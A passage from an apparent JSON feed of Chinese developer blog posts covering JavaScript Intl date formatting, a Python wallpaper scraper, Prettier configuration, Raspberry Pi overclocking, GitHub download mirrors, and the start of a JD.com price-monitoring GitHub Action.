<code>options</code> 中设置 <code>calendar</code> 属性和 <code>numberingSystem</code> 属性来替换区域设置名称中对 u 扩展的使用。这也是推荐方式。</p></blockquote>\n<p>这非常直观，我们可以指定区域设置和格式化选项来初始化一个格式化器，并在之后使用格式化器对象的 <code>format</code> 方法来格式化一个 <code>Date</code> 对象。这里的格式化选项其实非常灵活，能格式化的不只是日期，时间也可以被灵活地格式化，有非常多的组合可以选择。我们不会在这里详细解释每一个选项，你可以访问 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat\" rel=\"noopener\">MDN 文档</a>来了解更多。</p>\n<blockquote><p>如前文所述，<code>Intl.DateTimeFormat</code> 无法格式化毫秒。</p></blockquote>\n<p>不过需要注意的是，<strong>JavaScript 运行时不一定支持所有区域设置，也不一定支持所有格式化选项。</strong>在遇到不支持的情况时，<code>Intl.DateTimeFormat</code> 默认会静默 fallback 到最匹配的支持项，因此在处理不常见的区域设置或选项时，你可能需要再额外检查。你可以通过 <code>Intl.DateTimeFormat.supportedLocalesOf()</code> 静态方法判断当前运行时是否支持指定的区域设置，也可以在实例化格式化器后在对象上调用 <code>resolvedOptions()</code> 方法来检查运行时的解析结果是否与预期一致。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Intl.DateTimeFormat('yue-Hant-CN').resolvedOptions()\r\n// {locale: 'zh-CN', calendar: 'gregory', …}\r\n// fallback 至 zh-CN，与 yue-CN 的预期不一致</pre>\n<p>此外，正如你所看到的，各种语言在日期格式化中使用的文本 JavaScript 运行时都已经帮我们内置了。因此，我们甚至可以利用这些国际化特性来为我们的应用减少一点需要翻译的字符串——打包进应用的翻译越少，应用体积也就越小了嘛——比如说获取一周七天对应的名字：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const getWeekdayNames = (locale) =&gt; {\r\n     // 基于一个固定日期计算，这里选择 1970.1.1\r\n     // 不能使用 0，因为 Unix 时间戳 0 在不同时区的日期不一样\r\n    const base = new Date(1970, 0, 1).getTime()\r\n    const formatter = new Intl.DateTimeFormat(locale, { weekday: 'short' })\r\n    return Array.from({ length: 7 }, (_, day) =&gt; (\r\n        formatter.format(new Date(base + 3600000 * 24 * (-4 + day))) // 1970.1.1 是周四\r\n    ))\r\n}\r\n\r\ngetWeekdayNames('en-US') // ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat']\r\ngetWeekdayNames('zh-CN') // ['周日', '周一', '周二', '周三', '周四', '周五', '周六']\r\ngetWeekdayNames('ja') // ['日', '月', '火', '水', '木', '金', '土']\r\ngetWeekdayNames('ar-EG') // ['الأحد', 'الاثنين', 'الثلاثاء', 'الأربعاء', 'الخميس', 'الجمعة', 'السبت']</pre>\n<p>当然，如果你还是不喜欢运行时为你提供的格式，我们还有上文提到过的 <code>formatToParts()</code> 方法可以用。来看一个简单的例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Intl.DateTimeFormat('zh-CN', {\r\n    year: 'numeric',\r\n    month: 'short',\r\n    day: 'numeric',\r\n    weekday: 'long',\r\n    hour: 'numeric',\r\n    minute: 'numeric',\r\n    second: 'numeric',\r\n}).formatToParts(new Date())\r\n// [\r\n//     { type: 'year', value: '2021' },\r\n//     { type: 'literal', value: '年' },\r\n//     { type: 'month', value: '10' },\r\n//     { type: 'literal', value: '月' },\r\n//     { type: 'day', value: '13' },\r\n//     { type: 'literal', value: '日' },\r\n//     { type: 'weekday', value: '星期三' },\r\n//     { type: 'literal', value: ' ' },\r\n//     { type: 'dayPeriod', value: '上午' },\r\n//     { type: 'hour', value: '1' },\r\n//     { type: 'literal', value: ':' },\r\n//     { type: 'minute', value: '00' },\r\n//     { type: 'literal', value: ':' },\r\n//     { type: 'second', value: '00' }\r\n// ]</pre>\n<p>随后，你就可以自己解析这个数组来构造出你想要的时间格式了。最后，我们还可以使用 <code>Intl.RelativeTimeFormat</code> 来格式化相对日期。当然我们不会在这里详细讲解这个 API，你可以参考 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl/RelativeTimeFormat\" rel=\"noopener\">MDN 文档</a>。直接来看一个简单例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const getRelativeTime = (num, unit, locale) =&gt; {\r\n    return new Intl.RelativeTimeFormat(locale, { numeric: 'auto' }).format(num, unit)\r\n}\r\n\r\ngetRelativeTime(-3, 'day', 'en-US') // 3 days ago\r\ngetRelativeTime(-1, 'day', 'zh-CN') // 昨天\r\ngetRelativeTime(0, 'second', 'zh-CN') // 现在\r\ngetRelativeTime(3, 'hour', 'ja') // 3 時間後</pre>\n<blockquote><p><code>Intl.RelativeTimeFormat</code> 是一个相对较晚进入标准的对象，因此浏览器支持程度较差，可能需要使用 <a href=\"https://formatjs.io/docs/polyfills/intl-relativetimeformat\" rel=\"noopener\">Polyfill</a>。不过目前（2021.10）主流浏览器的最新版本均已支持此 API。</p></blockquote>\n<h1>未来</h1>\n<p>我希望这篇文章时区转换的部分可以很快过时——这并非无稽之谈，目前（2021.10）TC39 的 <a href=\"https://github.com/tc39/proposal-temporal\" rel=\"noopener\"><code>Temporal</code> 提案</a>已经进入 Stage 3 了。<strong><code>Temporal</code> 提案定义了一个新的、时区友好的 <code>Temporal</code> 命名空间，并期望在不久后就能进入标准并最终应用于生产环境。</strong><code>Temporal</code> 定义了完整的时区、时间段、日历规则的处理，且拥有简单明了的 API。那时候，JavaScript 的时区处理就不会再如此痛苦了。由于目前 <code>Temporal</code> 提案还未进入标准，API 暂未稳定，我们无法将其用于生产环境，但我们可以来看一个简单的例子感受一下这个 API 的强大。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const zonedDateTime = Temporal.ZonedDateTime.from({\r\n  timeZone: 'America/Los_Angeles',\r\n  year: 1995,\r\n  month: 12,\r\n  day: 7,\r\n  hour: 3,\r\n  minute: 24,\r\n  second: 30,\r\n  millisecond: 0,\r\n  microsecond: 3,\r\n  nanosecond: 500,\r\n  calendar: 'iso8601'\r\n}) // 1995-12-07T03:24:30.0000035-08:00[America/Los_Angeles]</pre>\n<p>如果你希望立刻开始使用 <code>Temporal</code>，现在已有 Polyfill 可用。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"js-temporal\" data-mdxgithubp=\"temporal-polyfill\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/js-temporal/temporal-polyfill\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>不过，时区问题不会消失，各地区的习惯也很难融合到一起。时间的国际化处理是<a href=\"https://yourcalendricalfallacyis.com/\" rel=\"noopener\">极其复杂</a>的，前端中的时间国际化仍然值得我们认真关注。</p>\n","link":"https://flyhigher.top/develop/2482.html"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span 